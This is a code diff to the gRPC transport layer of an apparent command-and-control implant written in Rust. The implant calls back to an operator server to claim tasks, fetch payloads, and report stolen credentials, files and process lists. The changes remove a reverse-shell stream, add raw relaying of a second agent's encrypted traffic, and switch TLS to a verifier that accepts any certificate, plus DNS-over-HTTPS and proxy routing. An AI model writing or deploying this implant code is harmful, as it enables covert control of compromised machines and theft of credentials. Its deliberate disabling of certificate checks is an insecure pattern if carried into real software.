@@ -1,5 +1,6 @@
 use anyhow::Result;
-use hyper::Uri;
+use bytes::{Buf, BufMut};
+use http::Uri;
 use pb::c2::*;
 use pb::config::Config;
 use std::str::FromStr;
@@ -9,18 +10,104 @@ use tonic::Request;
 
 #[cfg(feature = "doh")]
 use crate::dns_resolver::doh::DohProvider;
-
 use crate::Transport;
 
+use crate::tls_utils::AcceptAllCertVerifier;
+use std::sync::Arc;
+
+// RawCodec is a passthrough tonic codec that sends/receives raw byte slices unchanged.
+// Used by forward_raw so that pre-encrypted bytes from Agent B aren't re-encoded.
+#[derive(Debug, Default, Clone)]
+struct RawCodec;
+impl tonic::codec::Codec for RawCodec {
+    type Encode = Vec<u8>;
+    type Decode = Vec<u8>;
+    type Encoder = RawEncoder;
+    type Decoder = RawDecoder;
+    fn encoder(&mut self) -> Self::Encoder {
+        RawEncoder
+    }
+    fn decoder(&mut self) -> Self::Decoder {
+        RawDecoder
+    }
+}
+#[derive(Debug, Default, Clone)]
+struct RawEncoder;
+impl tonic::codec::Encoder for RawEncoder {
+    type Item = Vec<u8>;
+    type Error = tonic::Status;
+    fn encode(
+        &mut self,
+        item: Self::Item,
+        buf: &mut tonic::codec::EncodeBuf<'_>,
+    ) -> std::result::Result<(), Self::Error> {
+        buf.put_slice(&item);
+        Ok(())
+    }
+}
+#[derive(Debug, Default, Clone)]
+struct RawDecoder;
+impl tonic::codec::Decoder for RawDecoder {
+    type Item = Vec<u8>;
+    type Error = tonic::Status;
+    fn decode(
+        &mut self,
+        buf: &mut tonic::codec::DecodeBuf<'_>,
+    ) -> std::result::Result<Option<Self::Item>, Self::Error> {
+        if !buf.has_remaining() {
+            return Ok(None);
+        }
+        let chunk = buf.chunk().to_vec();
+        buf.advance(chunk.len());
+        Ok(Some(chunk))
+    }
+}
 use std::time::Duration;
+
+#[derive(Clone)]
+struct ForceHttpsConnector<C> {
+    inner: C,
+    force: bool,
+}
+
+impl<C> tower::Service<http::Uri> for ForceHttpsConnector<C>
+where
+    C: tower::Service<http::Uri> + Clone + Send + 'static,
+    C::Response: Send,
+    C::Error: Send,
+    C::Future: Send,
+{
+    type Response = C::Response;
+    type Error = C::Error;
+    type Future = C::Future;
+
+    fn poll_ready(
+        &mut self,
+        cx: &mut std::task::Context<'_>,
+    ) -> std::task::Poll<std::result::Result<(), Self::Error>> {
+        self.inner.poll_ready(cx)
+    }
+
+    fn call(&mut self, uri: http::Uri) -> Self::Future {
+        if self.force {
+            let mut parts = uri.into_parts();
+            if parts.scheme == Some(http::uri::Scheme::HTTP) {
+                parts.scheme = Some(http::uri::Scheme::HTTPS);
+            }
+            let https_uri = http::Uri::from_parts(parts).expect("valid uri");
+            self.inner.call(https_uri)
+        } else {
+            self.inner.call(uri)
+        }
+    }
+}
 
 static CLAIM_TASKS_PATH: &str = "/c2.C2/ClaimTasks";
 static FETCH_ASSET_PATH: &str = "/c2.C2/FetchAsset";
 static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
 static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
 static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
-static REPORT_TASK_OUTPUT_PATH: &str = "/c2.C2/ReportTaskOutput";
-static REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";
+static REPORT_OUTPUT_PATH: &str = "/c2.C2/ReportOutput";
 static CREATE_PORTAL_PATH: &str = "/c2.C2/CreatePortal";
 
 #[allow(clippy::upper_case_acronyms)]
@@ -29,7 +116,12 @@ pub struct GRPC {
     grpc: Option<tonic::client::Grpc<tonic::transport::Channel>>,
 }
 
+#[async_trait::async_trait]
 impl Transport for GRPC {
+    fn clone_box(&self) -> Box<dyn Transport + Send + Sync> {
+        Box::new(self.clone())
+    }
+
     fn init() -> Self {
         GRPC { grpc: None }
     }
@@ -39,39 +131,75 @@ impl Transport for GRPC {
         let callback = crate::transport::extract_uri_from_config(&config)?;
         let extra_map = crate::transport::extract_extra_from_config(&config);
 
-        let endpoint = tonic::transport::Endpoint::from_shared(callback)?;
+        // Tonic 0.14+ might fail with "Connecting to HTTPS without TLS enabled" if we use https:// scheme
+        // even if we provide a TLS-enabled connector. We workaround this by using http:// scheme
+        // internally and forcing https:// in the connector.
+        let internal_callback = if callback.starts_with("https://") {
+            callback.replacen("https://", "http://", 1)
+        } else {
+            callback.clone()
+        };
+
+        let endpoint = tonic::transport::Endpoint::from_shared(internal_callback)?;
 
         #[cfg(feature = "doh")]
         let doh: Option<&String> = extra_map.get("doh");
 
+        // Create base HTTP connector (either DOH-enabled or system DNS)
         #[cfg(feature = "doh")]
         let mut http = match doh {
-            // TODO: Add provider selection based on the provider string
-            Some(_provider) => {
-                crate::dns_resolver::doh::create_doh_connector(DohProvider::Cloudflare)?
+            Some(provider_str) => {
+                let provider = match provider_str.to_lowercase().as_str() {
+                    "cloudflare" => DohProvider::Cloudflare,
+                    "google" => DohProvider::Google,
+                    "quad9" => DohProvider::Quad9,
+                    _ => DohProvider::Cloudflare,
+                };
+                crate::dns_resolver::doh::create_doh_connector_hyper1(provider)?
             }
             None => {
                 // Use system DNS when DOH not explicitly requested
-                crate::dns_resolver::doh::create_doh_connector(DohProvider::System)?
+                crate::dns_resolver::doh::create_doh_connector_hyper1(DohProvider::System)?
             }
         };
 
         #[cfg(not(feature = "doh"))]
-        let mut http = hyper::client::HttpConnector::new();
+        let mut http = hyper_util::client::legacy::connect::HttpConnector::new();
 
         let proxy_uri = extra_map.get("http_proxy");
 
         http.enforce_http(false);
         http.set_nodelay(true);
 
+        let tls_config = rustls::ClientConfig::builder_with_provider(Arc::new(
+            rustls::crypto::ring::default_provider(),
+        ))
+        .with_safe_default_protocol_versions()
+        .expect("failed to set default protocol versions")
+        .dangerous()
+        .with_custom_certificate_verifier(Arc::new(AcceptAllCertVerifier))
+        .with_no_client_auth();
+
+        let connector = hyper_rustls::HttpsConnectorBuilder::new()
+            .with_tls_config(tls_config)
+            .https_or_http()
+            .enable_http2()
+            .wrap_connector(http);
+
+        // Wrap connector to force HTTPS if the original callback was HTTPS
+        let connector = ForceHttpsConnector {
+            inner: connector,
+            force: callback.starts_with("https://"),
+        };
+
         let channel = match proxy_uri {
             Some(proxy_uri_string) => {
-                let proxy: hyper_proxy::Proxy = hyper_proxy::Proxy::new(
-                    hyper_proxy::Intercept::All,
+                let proxy = hyper_http_proxy::Proxy::new(
+                    hyper_http_proxy::Intercept::All,
                     Uri::from_str(proxy_uri_string.as_str())?,
                 );
-                let mut proxy_connector = hyper_proxy::ProxyConnector::from_proxy(http, proxy)?;
-                proxy_connector.set_tls(None);
+                let proxy_connector =
+                    hyper_http_proxy::ProxyConnector::from_proxy(connector, proxy)?;
 
                 endpoint
                     .rate_limit(1, Duration::from_millis(25))
@@ -80,7 +208,7 @@ impl Transport for GRPC {
             #[allow(non_snake_case) /* None is a reserved keyword */]
             None => endpoint
                 .rate_limit(1, Duration::from_millis(25))
-                .connect_with_connector_lazy(http),
+                .connect_with_connector_lazy(connector),
         };
 
         let grpc = tonic::client::Grpc::new(channel);
@@ -97,9 +225,8 @@ impl Transport for GRPC {
         request: FetchAssetRequest,
         tx: Sender<FetchAssetResponse>,
     ) -> Result<()> {
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         let filename = request.name.clone();
-
         let resp = self.fetch_asset_impl(request).await?;
         let mut stream = resp.into_inner();
         tokio::spawn(async move {
@@ -113,7 +240,7 @@ impl Transport for GRPC {
                         }
                     },
                     Err(_err) => {
-                        #[cfg(debug_assertions)]
+                        #[cfg(feature = "print_debug")]
                         log::error!("failed to download file: {}: {}", filename, _err);
 
                         return;
@@ -122,7 +249,7 @@ impl Transport for GRPC {
                 match tx.send(msg) {
                     Ok(_) => {}
                     Err(_err) => {
-                        #[cfg(debug_assertions)]
+                        #[cfg(feature = "print_debug")]
                         log::error!(
                             "failed to send downloaded file chunk: {}: {}",
                             filename,
@@ -163,50 +290,12 @@ impl Transport for GRPC {
         Ok(resp.into_inner())
     }
 
-    async fn report_task_output(
+    async fn report_output(
         &mut self,
-        request: ReportTaskOutputRequest,
-    ) -> Result<ReportTaskOutputResponse> {
-        let resp = self.report_task_output_impl(request).await?;
+        request: ReportOutputRequest,
+    ) -> Result<ReportOutputResponse> {
+        let resp = self.report_output_impl(request).await?;
         Ok(resp.into_inner())
-    }
-
-    async fn reverse_shell(
-        &mut self,
-        rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
-        tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
-    ) -> Result<()> {
-        // Wrap PTY output receiver in stream
-        let req_stream = tokio_stream::wrappers::ReceiverStream::new(rx);
-
-        // Open gRPC Bi-Directional Stream
-        let resp = self.reverse_shell_impl(req_stream).await?;
-        let mut resp_stream = resp.into_inner();
-
-        // Spawn task to deliver PTY input
-        tokio::spawn(async move {
-            while let Some(msg) = match resp_stream.message().await {
-                Ok(m) => m,
-                Err(_err) => {
-                    #[cfg(debug_assertions)]
-                    log::error!("failed to receive gRPC stream response: {}", _err);
-
-                    None
-                }
-            } {
-                match tx.send(msg).await {
-                    Ok(_) => {}
-                    Err(_err) => {
-                        #[cfg(debug_assertions)]
-                        log::error!("failed to queue pty input: {}", _err);
-
-                        return;
-                    }
-                }
-            }
-        });
-
-        Ok(())
     }
 
     async fn create_portal(
@@ -226,7 +315,7 @@ impl Transport for GRPC {
             while let Some(msg) = match resp_stream.message().await {
                 Ok(m) => m,
                 Err(_err) => {
-                    #[cfg(debug_assertions)]
+                    #[cfg(feature = "print_debug")]
                     log::error!("failed to receive gRPC stream response: {}", _err);
 
                     None
@@ -235,7 +324,7 @@ impl Transport for GRPC {
                 match tx.send(msg).await {
                     Ok(_) => {}
                     Err(_err) => {
-                        #[cfg(debug_assertions)]
+                        #[cfg(feature = "print_debug")]
                         log::error!("failed to queue portal input: {}", _err);
 
                         return;
@@ -261,6 +350,59 @@ impl Transport for GRPC {
 
     fn list_available(&self) -> Vec<String> {
         vec!["grpc".to_string()]
+    }
+
+    async fn forward_raw(
+        &mut self,
+        path: String,
+        rx: tokio::sync::mpsc::Receiver<Vec<u8>>,
+        tx: tokio::sync::mpsc::Sender<Vec<u8>>,
+    ) -> anyhow::Result<()> {
+        if self.grpc.is_none() {
+            return Err(anyhow::anyhow!("grpc client not created"));
+        }
+        self.grpc
+            .as_mut()
+            .unwrap()
+            .ready()
+            .await
+            .map_err(|e| anyhow::anyhow!("Service was not ready: {}", e))?;
+
+        // Agent B already ChaCha-encodes its messages before sending over UDS/TCP.
+        // Using RawCodec here forwards those bytes unchanged so Tavern sees
+        // exactly one layer of ChaCha encryption (not two).
+        let codec = RawCodec;
+        let uri_path = tonic::codegen::http::uri::PathAndQuery::try_from(path)?;
+
+        let req_stream = tokio_stream::wrappers::ReceiverStream::new(rx);
+        let req = tonic::Request::new(req_stream);
+
+        let resp = self
+            .grpc
+            .as_mut()
+            .unwrap()
+            .streaming(req, uri_path, codec)
+            .await?;
+        let mut resp_stream = resp.into_inner();
+
+        tokio::spawn(async move {
+            while let Some(msg) = match resp_stream.message().await {
+                Ok(m) => m,
+                Err(_err) => {
+                    #[cfg(feature = "print_debug")]
+                    log::error!("failed to receive gRPC stream response: {}", _err);
+                    None
+                }
+            } {
+                if tx.send(msg).await.is_err() {
+                    #[cfg(feature = "print_debug")]
+                    log::error!("failed to queue remote input");
+                    return;
+                }
+            }
+        });
+
+        Ok(())
     }
 }
 
@@ -421,10 +563,10 @@ impl GRPC {
 
     ///
     /// Report execution output for a task.
-    pub async fn report_task_output_impl(
+    pub async fn report_output_impl(
         &mut self,
-        request: impl tonic::IntoRequest<ReportTaskOutputRequest>,
-    ) -> std::result::Result<tonic::Response<ReportTaskOutputResponse>, tonic::Status> {
+        request: impl tonic::IntoRequest<ReportOutputRequest>,
+    ) -> std::result::Result<tonic::Response<ReportOutputResponse>, tonic::Status> {
         if self.grpc.is_none() {
             return Err(tonic::Status::new(
                 tonic::Code::FailedPrecondition,
@@ -438,42 +580,11 @@ impl GRPC {
             )
         })?;
         let codec = pb::xchacha::ChachaCodec::default();
-        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_TASK_OUTPUT_PATH);
+        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_OUTPUT_PATH);
         let mut req = request.into_request();
         req.extensions_mut()
-            .insert(GrpcMethod::new("c2.C2", "ReportTaskOutput"));
+            .insert(GrpcMethod::new("c2.C2", "ReportOutput"));
         self.grpc.as_mut().unwrap().unary(req, path, codec).await
-    }
-
-    async fn reverse_shell_impl(
-        &mut self,
-        request: impl tonic::IntoStreamingRequest<Message = ReverseShellRequest>,
-    ) -> std::result::Result<
-        tonic::Response<tonic::codec::Streaming<ReverseShellResponse>>,
-        tonic::Status,
-    > {
-        if self.grpc.is_none() {
-            return Err(tonic::Status::new(
-                tonic::Code::FailedPrecondition,
-                "grpc client not created".to_string(),
-            ));
-        }
-        self.grpc.as_mut().unwrap().ready().await.map_err(|e| {
-            tonic::Status::new(
-                tonic::Code::Unknown,
-                format!("Service was not ready: {}", e),
-            )
-        })?;
-        let codec = pb::xchacha::ChachaCodec::default();
-        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REVERSE_SHELL_PATH);
-        let mut req = request.into_streaming_request();
-        req.extensions_mut()
-            .insert(GrpcMethod::new("c2.C2", "ReverseShell"));
-        self.grpc
-            .as_mut()
-            .unwrap()
-            .streaming(req, path, codec)
-            .await
     }
 
     async fn create_portal_impl(
